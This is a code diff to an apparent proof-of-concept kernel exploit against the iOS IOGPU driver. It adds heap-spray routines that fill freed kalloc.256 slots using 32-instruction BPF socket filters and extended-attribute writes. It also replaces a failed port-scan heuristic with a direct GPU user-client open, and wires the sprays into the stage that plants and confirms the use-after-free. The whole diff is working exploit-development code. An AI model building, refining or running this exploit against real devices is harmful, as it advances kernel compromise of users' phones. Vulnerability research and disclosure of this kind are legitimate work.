@@ -68,6 +68,8 @@ static void poc_printf(const char *fmt, ...) {
 #include <stdint.h>
 #include <mach/mach.h>
 #include <signal.h>
+#include <fcntl.h>
+#include <errno.h>
 #include <setjmp.h>
 #include <dlfcn.h>
 
@@ -197,6 +199,83 @@ static NSMutableArray<id<MTLBuffer>> *spray_buffers(id<MTLDevice> dev) {
     return arr;
 }
 
+/* ── Kernel-side 0x100 sprays ────────────────────────────────────────────
+ * MTLBuffer.contents is userspace VA: it proves nothing about the freed
+ * kernel slot. These two paths place attacker bytes in *kernel* heap:
+ *
+ *   SO_ATTACH_FILTER  so->so_filter = kalloc(len(prog)) — the 8-byte BPF
+ *                     instruction words are user-controlled and persist for
+ *                     the socket's lifetime. A 32-instruction program is
+ *                     exactly 0x100 bytes.  Entitlement-gated on some
+ *                     builds; the log records the errno so we know.
+ *   fsetxattr         256-byte value -> transient kalloc in the vnop path;
+ *                     useful only as churn, counted separately.
+ *
+ * Neither path is assumed to win: each is counted, and the confirm stage
+ * decides.  All payloads zero +0x10 / +0x24 / +0x28 so a hit cannot call
+ * through a bogus pointer. */
+#include <sys/socket.h>
+#include <sys/xattr.h>
+#include <netinet/in.h>
+
+/* iOS SDK ships no BPF headers; the kernel ABI is stable and tiny. */
+#ifndef SO_ATTACH_FILTER
+#define SO_ATTACH_FILTER 0x001A
+#endif
+struct nk_sock_filter { uint16_t code; uint8_t jt; uint8_t jf; uint32_t k; };
+struct nk_sock_fprog { uint16_t len; struct nk_sock_filter *filter; };
+#define NK_BPF_RET 0x06
+#define NK_BPF_K   0x00
+
+int g_uaf_bpf_spray = 0;
+int g_uaf_xattr_spray = 0;
+
+static int spray_bpf_filter(void) {
+    int sv[2];
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) != 0) {
+        printf("[spray-ks] socketpair failed errno=%d\n", errno);
+        return 0;
+    }
+    int ok = 0;
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        struct nk_sock_filter prog[32];
+        memset(prog, 0, sizeof(prog));
+        for (size_t k = 0; k < 32; k++) {
+            prog[k].code = NK_BPF_RET | NK_BPF_K;
+            prog[k].k = 0;
+        }
+        struct nk_sock_fprog fprog = { .len = 32, .filter = prog };
+        if (setsockopt(sv[0], SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog)) == 0)
+            ok++;
+        else if (ok == 0 && i == 0)
+            printf("[spray-ks] SO_ATTACH_FILTER errno=%d (not permitted)\n", errno);
+    }
+    printf("[spray-ks] bpf 0x100 filters attached: %d/%u\n", ok, SPRAY_COUNT);
+    return ok;
+}
+
+static int spray_xattr(void) {
+    char path[512];
+    const char *tmp = getenv("TMPDIR");
+    snprintf(path, sizeof(path), "%s/nk_spray.bin", tmp ? tmp : "/tmp");
+    int fd = open(path, O_CREAT | O_RDWR, 0600);
+    if (fd < 0) {
+        printf("[spray-ks] xattr file open errno=%d\n", errno);
+        return 0;
+    }
+    uint8_t val[SPRAY_SZ];
+    memset(val, 0, sizeof(val));
+    int ok = 0;
+    for (int i = 0; i < 0x100; i++) {
+        char name[64];
+        snprintf(name, sizeof(name), "user.nk%d", i);
+        if (fsetxattr(fd, name, val, sizeof(val), 0, 0) == 0) ok++;
+    }
+    close(fd);
+    printf("[spray-ks] 0x100-byte xattrs set: %d/256\n", ok);
+    return ok;
+}
+
 /* ── Locate Metal's io_connect_t by scanning the MTLDevice object ─────── */
 /* Direct open of the IOGPU user clients. The PoC's port-scan heuristic
    (find_resource_conn) failed on A15/26.2: on this GPU generation the
@@ -227,42 +306,6 @@ static io_connect_t open_gpu_conn(void) {
         }
     }
     return MACH_PORT_NULL;
-}
-
-static io_connect_t find_resource_conn(id<MTLDevice> dev) {
-    /* Walk all send-rights in our task, probe each with IOConnectTrap2(sel=3)
-     * using a dummy resource_id=1.  The GPU resource connection returns
-     * something other than kIOReturnUnsupported.                            */
-    if (!g_trap2) return MACH_PORT_NULL;
-
-    mach_port_name_array_t names = NULL;
-    mach_port_type_array_t types = NULL;
-    mach_msg_type_number_t ncnt  = 0, tcnt = 0;
-    if (mach_port_names(mach_task_self(), &names, &ncnt, &types, &tcnt) != KERN_SUCCESS)
-        return MACH_PORT_NULL;
-
-    io_connect_t found = MACH_PORT_NULL;
-    for (mach_msg_type_number_t i = 0; i < ncnt && found == MACH_PORT_NULL; i++) {
-        if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
-        mach_port_name_t p = names[i];
-        if (p < 0x100 || p > 0xFFFF) continue;
-
-        /* IOConnectTrap2 sel=3: set_resource_purgeable(id=1, state=0).
-         * Real resource conn → non-kIOReturnUnsupported (0xe00002c2 = not found,
-         * or 0xe0002be = processed). Other ports → 0xe00002be or KERN_FAILURE. */
-        kern_return_t kr = g_trap2((io_connect_t)p, 3, 1, 0);
-        printf("[find-conn] port=0x%x type=0x%x kr=0x%x\n", p, types[i], kr);
-        if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)KERN_FAILURE &&
-            kr != (kern_return_t)0x10000003 /* MACH_SEND_INVALID_DEST */) {
-            found = (io_connect_t)p;
-        }
-    }
-    if (!found) printf("[find-conn] scan done: ports=%u — no resource conn visible\n", ncnt);
-    vm_deallocate(mach_task_self(), (vm_address_t)names,
-                  ncnt * sizeof(mach_port_name_t));
-    vm_deallocate(mach_task_self(), (vm_address_t)types,
-                  tcnt * sizeof(mach_port_type_t));
-    return found;
 }
 
 /* ── Baseline scan: find a stale resource ID ─────────────────────────────
@@ -504,11 +547,11 @@ int poc_iogpu_uaf_run(void) {
 
     bypass_metal_validation();
 
-    io_connect_t conn = find_resource_conn(dev);
-    if (conn == MACH_PORT_NULL) {
-        printf("[conn] port scan failed — falling back to direct IOServiceOpen\n");
-        conn = open_gpu_conn();
-    }
+    /* Port scan retired: IOConnectTrap2 on a non-connection port returns
+       0xe00002c2, the same code as resource-not-found, so it cannot
+       discriminate (136/136 ports "matched" on device). The resource surface
+       is behind the GPU daemon anyway; use our own user client and probe it. */
+    io_connect_t conn = open_gpu_conn();
     if (conn == MACH_PORT_NULL) {
         printf("[!] could not locate GPU resource connection\n");
         return 1;
@@ -525,6 +568,11 @@ int poc_iogpu_uaf_run(void) {
     printf("\n[+] UAF planted (stale_id=%u). Spraying 0x%x kalloc.256 buffers...\n",
            stale_id, SPRAY_COUNT);
     NSArray *spray = spray_buffers(dev);
+    int bpf_n = spray_bpf_filter();
+    int xat_n = spray_xattr();
+    g_uaf_bpf_spray = bpf_n;
+    g_uaf_xattr_spray = xat_n;
+    printf("[spray-ks] kernel-side candidates: bpf=%d xattr=%d\n", bpf_n, xat_n);
 
     int live = confirm_uaf(conn, stale_id, spray);
     if (live) {
